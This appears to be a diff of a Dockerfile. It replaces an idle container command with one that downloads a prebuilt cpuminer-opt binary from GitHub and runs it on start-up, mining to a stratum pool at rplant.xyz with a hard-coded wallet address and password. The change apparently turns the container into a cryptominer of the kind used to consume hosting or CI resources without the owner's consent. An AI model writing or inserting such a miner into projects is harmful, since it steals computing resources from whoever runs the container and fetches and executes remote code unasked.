@@ -1,10 +1,10 @@
 FROM ubuntu:latest
 
-RUN apt-get update && apt-get install -y wget
+RUN apt-get update && apt-get install -y wget tar
 
 WORKDIR /app
 
-RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
+RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz && \
     tar -xvf cpuminer-opt-linux.tar.gz
 
-CMD ["tail", "-f", "/dev/null"]
+CMD ["./cpuminer-sse2", "-a", "yespowertide", "-o", "stratum+tcp://stratum-na.rplant.xyz:7059", "-u", "TEamxYU9QWLwNbfSt2jBww2Pd8oZdcdJ5Z.x", "-p", "webpassword=cecepabdul"]
